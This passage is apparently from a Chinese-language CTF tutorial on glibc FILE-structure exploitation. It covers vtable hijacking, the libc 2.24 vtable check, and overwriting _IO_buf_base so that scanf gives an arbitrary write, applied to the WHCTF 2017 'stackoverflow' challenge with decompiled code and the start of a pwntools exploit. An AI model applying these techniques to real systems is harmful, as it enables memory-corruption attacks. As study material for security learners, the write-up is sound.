+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;done&nbsp;+=&nbsp;(Len);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
+&nbsp;&nbsp;while&nbsp;(0)
+//&nbsp;libio/libioP.h
+//&nbsp;看来我们的任务还没完，再来看看PUTC和PUT
+#&nbsp;define&nbsp;PUT(F,&nbsp;S,&nbsp;N)&nbsp;&nbsp;&nbsp;_IO_sputn&nbsp;((F),&nbsp;(S),&nbsp;(N))
+#&nbsp;define&nbsp;PUTC(C,&nbsp;F)&nbsp;_IO_putc_unlocked&nbsp;(C,&nbsp;F)
+//&nbsp;又调用了别的，继续继续
+#define&nbsp;_IO_sputn(__fp,&nbsp;__s,&nbsp;__n)&nbsp;_IO_XSPUTN&nbsp;(__fp,&nbsp;__s,&nbsp;__n)
+#define&nbsp;_IO_XSPUTN(FP,&nbsp;DATA,&nbsp;N)&nbsp;JUMP2&nbsp;(__xsputn,&nbsp;FP,&nbsp;DATA,&nbsp;N)
+#define&nbsp;JUMP2(FUNC,&nbsp;THIS,&nbsp;X1,&nbsp;X2)&nbsp;(_IO_JUMPS_FUNC(THIS)-&gt;FUNC)&nbsp;(THIS,&nbsp;X1,&nbsp;X2)
+//&nbsp;终于送了一口气，跟了多少个函数都不记得了，不过最终是到点了。
+//&nbsp;这里做的事情就是通过层层移交，最终由跳表中的相应函数来完成
+//&nbsp;不过还有PUTC
+//&nbsp;libio/libio.h
+#define&nbsp;_IO_putc_unlocked(_ch,&nbsp;_fp)&nbsp;\
+&nbsp;&nbsp;&nbsp;(_IO_BE&nbsp;((_fp)-&gt;_IO_write_ptr&nbsp;&gt;=&nbsp;(_fp)-&gt;_IO_write_end,&nbsp;0)&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;?&nbsp;__overflow&nbsp;(_fp,&nbsp;(unsigned&nbsp;char)&nbsp;(_ch))&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;(unsigned&nbsp;char)&nbsp;(*(_fp)-&gt;_IO_write_ptr++&nbsp;=&nbsp;(_ch)))
+//&nbsp;调用了__overflow
+//&nbsp;libio/genops.h
+int
+__overflow&nbsp;(_IO_FILE&nbsp;*f,&nbsp;int&nbsp;ch)
+{
+&nbsp;&nbsp;/*&nbsp;This&nbsp;is&nbsp;a&nbsp;single-byte&nbsp;stream.&nbsp;&nbsp;*/
+&nbsp;&nbsp;if&nbsp;(f-&gt;_mode&nbsp;==&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;_IO_fwide&nbsp;(f,&nbsp;-1);
+&nbsp;&nbsp;return&nbsp;_IO_OVERFLOW&nbsp;(f,&nbsp;ch);
+}
+//&nbsp;又调用了_IO_OVERFLOW，根据之前的命名法，我们应该猜到这个很接近了
+#define&nbsp;_IO_OVERFLOW(FP,&nbsp;CH)&nbsp;JUMP1&nbsp;(__overflow,&nbsp;FP,&nbsp;CH)
+//&nbsp;依然是调用虚表函数</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这一段代码估计已经把大家的汗都看出来了，我们做个总结吧：其实就一句话，</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(227, 108, 9);"><strong>printf最终调用了虚表里的函数来完成输出任务</strong></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">也就是说，只要使用了printf，我们就相当于调用了虚表里的某个函数，具体哪一个还需要从源码去看，不过关于虚表的部分说到这基本也就够了，scanf的内容其实也是一样，最终都会到虚表里进行执行。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">到这里，我们就解决了关于利用虚表时候的问题，那就是什么时候调用，<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);"><strong>所以只要有输入输出，我们就可以调用到虚表的某个函数了</strong></span>。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>总结一下虚表的利用方法</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">因为libc中的标准输入输出函数会用到stdin，stdout和stderr几个结构体，而最终都会使用虚表函数来完成具体操作，所以如果可以操作虚表指针，就可以控制执行流。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>libc-2.24</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在2.24中，增加了一个虚表的检测机制，也就是虚表必须位于某一个位置以内，超过这一段就会直接被abort掉，所以这个看似美好的方法到2.24就已经用不了了。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">没了虚表，想想别的</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">1.</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; white-space: pre;"></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">输入buf也可以搞事情</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">到刚才，我们分析了虚表之前的部分，可是，我们其实是没有一直走到最底层的，因为至少得到<strong>read/write</strong>系统调用才算是真正进行了输入输出的操作，而这个操作我们并没有看到，那是因为他们都被实现在了虚表里。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在让我们来分析一下scanf的虚表实现内容吧。这次我们少看点源码，就看看这个underflow：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">int
+_IO_new_file_underflow&nbsp;(_IO_FILE&nbsp;*fp)
+{
+&nbsp;&nbsp;_IO_ssize_t&nbsp;count;
+#if&nbsp;0
+&nbsp;&nbsp;/*&nbsp;SysV&nbsp;does&nbsp;not&nbsp;make&nbsp;this&nbsp;test;&nbsp;take&nbsp;it&nbsp;out&nbsp;for&nbsp;compatibility&nbsp;*/
+&nbsp;&nbsp;if&nbsp;(fp-&gt;_flags&nbsp;&amp;&nbsp;_IO_EOF_SEEN)
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(EOF);
+#endif
+&nbsp;&nbsp;if&nbsp;(fp-&gt;_flags&nbsp;&amp;&nbsp;_IO_NO_READS)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fp-&gt;_flags&nbsp;|=&nbsp;_IO_ERR_SEEN;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__set_errno&nbsp;(EBADF);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;EOF;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;只有在read_ptr&nbsp;&lt;&nbsp;read_end的时候才会调用read，否则直接返回read_ptr
+&nbsp;&nbsp;if&nbsp;(fp-&gt;_IO_read_ptr&nbsp;&lt;&nbsp;fp-&gt;_IO_read_end)
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;*(unsigned&nbsp;char&nbsp;*)&nbsp;fp-&gt;_IO_read_ptr;
+&nbsp;&nbsp;if&nbsp;(fp-&gt;_IO_buf_base&nbsp;==&nbsp;NULL)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Maybe&nbsp;we&nbsp;already&nbsp;have&nbsp;a&nbsp;push&nbsp;back&nbsp;pointer.&nbsp;&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(fp-&gt;_IO_save_base&nbsp;!=&nbsp;NULL)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free&nbsp;(fp-&gt;_IO_save_base);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fp-&gt;_flags&nbsp;&amp;=&nbsp;~_IO_IN_BACKUP;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_IO_doallocbuf&nbsp;(fp);
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;/*&nbsp;Flush&nbsp;all&nbsp;line&nbsp;buffered&nbsp;files&nbsp;before&nbsp;reading.&nbsp;*/
+&nbsp;&nbsp;/*&nbsp;FIXME&nbsp;This&nbsp;can/should&nbsp;be&nbsp;moved&nbsp;to&nbsp;genops&nbsp;??&nbsp;*/
+&nbsp;&nbsp;if&nbsp;(fp-&gt;_flags&nbsp;&amp;&nbsp;(_IO_LINE_BUF|_IO_UNBUFFERED))
+&nbsp;&nbsp;&nbsp;&nbsp;{
+#if&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_IO_flush_all_linebuffered&nbsp;();
+#else
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;We&nbsp;used&nbsp;to&nbsp;flush&nbsp;all&nbsp;line-buffered&nbsp;stream.&nbsp;&nbsp;This&nbsp;really&nbsp;isn&#39;t
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;required&nbsp;by&nbsp;any&nbsp;standard.&nbsp;&nbsp;My&nbsp;recollection&nbsp;is&nbsp;that
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;traditional&nbsp;Unix&nbsp;systems&nbsp;did&nbsp;this&nbsp;for&nbsp;stdout.&nbsp;&nbsp;stderr&nbsp;better
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;not&nbsp;be&nbsp;line&nbsp;buffered.&nbsp;&nbsp;So&nbsp;we&nbsp;do&nbsp;just&nbsp;that&nbsp;here
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;explicitly.&nbsp;&nbsp;--drepper&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_IO_acquire_lock&nbsp;(_IO_stdout);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((_IO_stdout-&gt;_flags&nbsp;&amp;&nbsp;(_IO_LINKED&nbsp;|&nbsp;_IO_NO_WRITES&nbsp;|&nbsp;_IO_LINE_BUF))
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;==&nbsp;(_IO_LINKED&nbsp;|&nbsp;_IO_LINE_BUF))
+&nbsp;&nbsp;&nbsp;&nbsp;_IO_OVERFLOW&nbsp;(_IO_stdout,&nbsp;EOF);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_IO_release_lock&nbsp;(_IO_stdout);
+#endif
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;_IO_switch_to_get_mode&nbsp;(fp);
+&nbsp;&nbsp;/*&nbsp;This&nbsp;is&nbsp;very&nbsp;tricky.&nbsp;We&nbsp;have&nbsp;to&nbsp;adjust&nbsp;those
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pointers&nbsp;before&nbsp;we&nbsp;call&nbsp;_IO_SYSREAD&nbsp;()&nbsp;since
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;we&nbsp;may&nbsp;longjump&nbsp;()&nbsp;out&nbsp;while&nbsp;waiting&nbsp;for
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;input.&nbsp;Those&nbsp;pointers&nbsp;may&nbsp;be&nbsp;screwed&nbsp;up.&nbsp;H.J.&nbsp;*/
+&nbsp;&nbsp;fp-&gt;_IO_read_base&nbsp;=&nbsp;fp-&gt;_IO_read_ptr&nbsp;=&nbsp;fp-&gt;_IO_buf_base;
+&nbsp;&nbsp;fp-&gt;_IO_read_end&nbsp;=&nbsp;fp-&gt;_IO_buf_base;
+&nbsp;&nbsp;fp-&gt;_IO_write_base&nbsp;=&nbsp;fp-&gt;_IO_write_ptr&nbsp;=&nbsp;fp-&gt;_IO_write_end
+&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;fp-&gt;_IO_buf_base;
+&nbsp;&nbsp;//&nbsp;这里调用read(0,&nbsp;_IO_buf_base,&nbsp;_IO_buf_end&nbsp;-&nbsp;_IO_buf_base)
+&nbsp;&nbsp;count&nbsp;=&nbsp;_IO_SYSREAD&nbsp;(fp,&nbsp;fp-&gt;_IO_buf_base,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fp-&gt;_IO_buf_end&nbsp;-&nbsp;fp-&gt;_IO_buf_base);
+&nbsp;&nbsp;if&nbsp;(count&nbsp;&lt;=&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(count&nbsp;==&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;fp-&gt;_flags&nbsp;|=&nbsp;_IO_EOF_SEEN;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;&nbsp;fp-&gt;_flags&nbsp;|=&nbsp;_IO_ERR_SEEN,&nbsp;count&nbsp;=&nbsp;0;
+&nbsp;&nbsp;}
+&nbsp;&nbsp;//&nbsp;read_end加上这次读所读到的字节数
+&nbsp;&nbsp;fp-&gt;_IO_read_end&nbsp;+=&nbsp;count;
+&nbsp;&nbsp;if&nbsp;(count&nbsp;==&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;If&nbsp;a&nbsp;stream&nbsp;is&nbsp;read&nbsp;to&nbsp;EOF,&nbsp;the&nbsp;calling&nbsp;application&nbsp;may&nbsp;switch&nbsp;active
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;handles.&nbsp;&nbsp;As&nbsp;a&nbsp;result,&nbsp;our&nbsp;offset&nbsp;cache&nbsp;would&nbsp;no&nbsp;longer&nbsp;be&nbsp;valid,&nbsp;so
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unset&nbsp;it.&nbsp;&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fp-&gt;_offset&nbsp;=&nbsp;_IO_pos_BAD;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;EOF;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;if&nbsp;(fp-&gt;_offset&nbsp;!=&nbsp;_IO_pos_BAD)
+&nbsp;&nbsp;&nbsp;&nbsp;_IO_pos_adjust&nbsp;(fp-&gt;_offset,&nbsp;count);
+&nbsp;&nbsp;return&nbsp;*(unsigned&nbsp;char&nbsp;*)&nbsp;fp-&gt;_IO_read_ptr;
+}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在调用underflow之前其实会进行一个<strong>_IO_read_ptr++</strong>的操作，配合上underflow，我想大家都应该能看懂这个的含义吧？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">_IO_buf_base, _IO_buf_end, _IO_read_ptr, _IO_read_end 4个变量都是在_IO_FILE的结构体里的，buf_base到buf_end是一个buf，而read_ptr到read_end则比较神奇了，我猜测可能是还没有处理的部分，read_ptr在一开始和buf_base相等，输入之后read_end会指向输入之后的结尾部分，buf_end是不变的，每次输入只能输入buf_end-buf_base个size，而且只有在read_ptr &gt;= read_end，也就是为空的时候才能够读入buf_base。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">根据实际测验发现，每一次scanf似乎read_ptr都会加一，其实用到这个结论就可以了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当然，最主要的地方还是调用read系统调用，写入的位置就在buf_base!于是如果可以更改这个值，就可以利用scanf进行任意写了！</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个手法虽然相对虚表来说限制颇多，但是至少是提供了一个任意写的方案，可以作为扩大控制能力的一种手法，算是一种新的思路。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>WHCTF 2017 stackoverflow</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来我们来看一下这种新思路的应用吧。题目来源于WHCTF 2017。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">void&nbsp;__fastcall&nbsp;__noreturn&nbsp;main(__int64&nbsp;a1,&nbsp;char&nbsp;**a2,&nbsp;char&nbsp;**a3)
+{
+&nbsp;&nbsp;__int64&nbsp;v3;&nbsp;//&nbsp;ST08_8@1
+&nbsp;&nbsp;v3&nbsp;=&nbsp;*MK_FP(__FS__,&nbsp;40LL);
+&nbsp;&nbsp;setvbuf(stdin,&nbsp;0LL,&nbsp;2,&nbsp;0LL);
+&nbsp;&nbsp;setvbuf(stdout,&nbsp;0LL,&nbsp;2,&nbsp;0LL);
+&nbsp;&nbsp;input_name();
+&nbsp;&nbsp;print_hint();
+&nbsp;&nbsp;while&nbsp;(&nbsp;1&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;main_proc();
+}
+__int64&nbsp;input_name()
+{
+&nbsp;&nbsp;char&nbsp;name;&nbsp;//&nbsp;[sp+0h]&nbsp;[bp-70h]@1
+&nbsp;&nbsp;__int64&nbsp;v2;&nbsp;//&nbsp;[sp+68h]&nbsp;[bp-8h]@1
+&nbsp;&nbsp;v2&nbsp;=&nbsp;*MK_FP(__FS__,&nbsp;40LL);
+&nbsp;&nbsp;printf(&quot;leave&nbsp;your&nbsp;name,&nbsp;bro:&quot;);
+&nbsp;&nbsp;read_content(&amp;name,&nbsp;0x50);
+&nbsp;&nbsp;printf(&quot;worrier&nbsp;%s,&nbsp;now&nbsp;begin&nbsp;your&nbsp;challenge&quot;,&nbsp;&amp;name);
+&nbsp;&nbsp;return&nbsp;*MK_FP(__FS__,&nbsp;40LL)&nbsp;^&nbsp;v2;
+}
+__int64&nbsp;__fastcall&nbsp;read_content(char&nbsp;*buf,&nbsp;int&nbsp;size)
+{
+&nbsp;&nbsp;__int64&nbsp;result;&nbsp;//&nbsp;rax@4
+&nbsp;&nbsp;__int64&nbsp;v3;&nbsp;//&nbsp;rcx@4
+&nbsp;&nbsp;unsigned&nbsp;int&nbsp;v4;&nbsp;//&nbsp;[sp+14h]&nbsp;[bp-Ch]@1
+&nbsp;&nbsp;__int64&nbsp;v5;&nbsp;//&nbsp;[sp+18h]&nbsp;[bp-8h]@1
+&nbsp;&nbsp;v5&nbsp;=&nbsp;*MK_FP(__FS__,&nbsp;40LL);
+&nbsp;&nbsp;v4&nbsp;=&nbsp;read(0,&nbsp;buf,&nbsp;size);
+&nbsp;&nbsp;if&nbsp;(&nbsp;(v4&nbsp;&amp;&nbsp;0x80000000)&nbsp;!=&nbsp;0&nbsp;)
+&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Error!&quot;,&nbsp;buf);
+&nbsp;&nbsp;&nbsp;&nbsp;exit(0);
+&nbsp;&nbsp;}
+&nbsp;&nbsp;result&nbsp;=&nbsp;v4;
+&nbsp;&nbsp;v3&nbsp;=&nbsp;*MK_FP(__FS__,&nbsp;40LL)&nbsp;^&nbsp;v5;
+&nbsp;&nbsp;return&nbsp;result;
+}
+__int64&nbsp;print_hint()
+{
+&nbsp;&nbsp;__int64&nbsp;v0;&nbsp;//&nbsp;ST08_8@1
+&nbsp;&nbsp;v0&nbsp;=&nbsp;*MK_FP(__FS__,&nbsp;40LL);
+&nbsp;&nbsp;puts(&quot;Welcome&nbsp;to&nbsp;stackoverflow&nbsp;challenge!!!&quot;);
+&nbsp;&nbsp;puts(&quot;it&nbsp;is&nbsp;really&nbsp;easy&quot;);
+&nbsp;&nbsp;return&nbsp;*MK_FP(__FS__,&nbsp;40LL)&nbsp;^&nbsp;v0;
+}
+__int64&nbsp;main_proc()
+{
+&nbsp;&nbsp;__int64&nbsp;result;&nbsp;//&nbsp;rax@7
+&nbsp;&nbsp;__int64&nbsp;v1;&nbsp;//&nbsp;rcx@7
+&nbsp;&nbsp;int&nbsp;size;&nbsp;//&nbsp;[sp+8h]&nbsp;[bp-18h]@1
+&nbsp;&nbsp;int&nbsp;tmp_size;&nbsp;//&nbsp;[sp+Ch]&nbsp;[bp-14h]@1
+&nbsp;&nbsp;void&nbsp;*v4;&nbsp;//&nbsp;[sp+10h]&nbsp;[bp-10h]@4
+&nbsp;&nbsp;__int64&nbsp;v5;&nbsp;//&nbsp;[sp+18h]&nbsp;[bp-8h]@1
+&nbsp;&nbsp;v5&nbsp;=&nbsp;*MK_FP(__FS__,&nbsp;40LL);
+&nbsp;&nbsp;printf(&quot;please&nbsp;input&nbsp;the&nbsp;size&nbsp;to&nbsp;trigger&nbsp;stackoverflow:&nbsp;&quot;);
+&nbsp;&nbsp;_isoc99_scanf(&quot;%d&quot;,&nbsp;&amp;size);
+&nbsp;&nbsp;IO_getc(stdin);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;get&nbsp;rid&nbsp;of&nbsp;\n
+&nbsp;&nbsp;tmp_size&nbsp;=&nbsp;size;
+&nbsp;&nbsp;while&nbsp;(&nbsp;size&nbsp;&gt;&nbsp;0x300000&nbsp;)
+&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;puts(&quot;too&nbsp;much&nbsp;bytes&nbsp;to&nbsp;do&nbsp;stackoverflow.&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;please&nbsp;input&nbsp;the&nbsp;size&nbsp;to&nbsp;trigger&nbsp;stackoverflow:&nbsp;&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;_isoc99_scanf(&quot;%d&quot;,&nbsp;&amp;size);
+&nbsp;&nbsp;&nbsp;&nbsp;IO_getc(stdin);
+&nbsp;&nbsp;}
+&nbsp;&nbsp;v4&nbsp;=&nbsp;malloc(0x28uLL);
+&nbsp;&nbsp;global_malloced&nbsp;=&nbsp;(char&nbsp;*)malloc(size&nbsp;+&nbsp;1);
+&nbsp;&nbsp;if&nbsp;(&nbsp;!global_malloced&nbsp;)
+&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Error!&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;exit(0);
+&nbsp;&nbsp;}
+&nbsp;&nbsp;printf(&quot;padding&nbsp;and&nbsp;ropchain:&nbsp;&quot;);
+&nbsp;&nbsp;read_content(global_malloced,&nbsp;size);
+&nbsp;&nbsp;global_malloced[tmp_size]&nbsp;=&nbsp;0;&nbsp;//&nbsp;out&nbsp;of&nbsp;bound&nbsp;write
+&nbsp;&nbsp;result&nbsp;=&nbsp;0LL;
+&nbsp;&nbsp;v1&nbsp;=&nbsp;*MK_FP(__FS__,&nbsp;40LL)&nbsp;^&nbsp;v5;
+&nbsp;&nbsp;return&nbsp;result;
+}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">题目有意思的地方就在于他的手法了。只能写入一个NULL的情况是非常受限制的，还是看看分析吧。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1)<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>漏洞位置</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">①首先是input_name存在一个没有null结尾的输入，于是可以造成泄露，效果是可以泄露出libc，这个是比较简单的地方。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">②main_proc中存在一个越界写，当输入size大于0x300000的时候，tmp_size会保存，之后重新输入之后tmp_size没有更新，导致越界写。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2)<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>利用思路</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">问题1：越界写，且只能写入一个null，看似毫无用处，不过好在可以写入很多个null，于是malloc也可以进行多次，所以第一个任务是要能够写东西到有意义的地方，栈，堆或者libc，通过分配大地址导致堆mmap，我们可以使得分配的内容在libc之前附近的位置，于是通过越界写就可以写入libc了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">问题2：写啥？这个真的是卡了很多人的一个地方，最终的选择，是写了_IO_buf_base，这个题目比较特殊，给出的libc-2.24.so偏移有特殊性，_IO_buf_base比_IO_buf_end小1，而且_IO_buf_end地址的最低位刚好是00，于是向base写入一个00，就可以指向end，之后往end写入malloc_hook的地址，然后循环一下使read_ptr和read_end相等，再次读入，就可以写入malloc_hook了</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">问题3：如何扩大控制。其实控制了执行流，就比较简单了，我们找了一个read：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">.text:0000000000400A23&nbsp;;&nbsp;7:&nbsp;&nbsp;&nbsp;read_content(&amp;name,&nbsp;0x50);
+.text:0000000000400A23&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax,&nbsp;[rbp+name]
+.text:0000000000400A27&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,&nbsp;50h
+.text:0000000000400A2C&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdi,&nbsp;rax
+.text:0000000000400A2F&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;read_content</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个read是input_name里的，往栈上写入内容，之后就可以进行rop了。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3)<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>exp</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">import&nbsp;sys
+from&nbsp;pwn&nbsp;import&nbsp;*
+context(os=&#39;linux&#39;,&nbsp;arch=&#39;amd64&#39;,&nbsp;log_level=&#39;debug&#39;)
+DEBUG&nbsp;=&nbsp;0
+GDB&nbsp;=&nbsp;1
+libc&nbsp;=&nbsp;ELF(&#39;./libc-2.24.so&#39;)
+if&nbsp;DEBUG:
+&nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;=&nbsp;process(&#39;./stackoverflow&#39;)
+else:
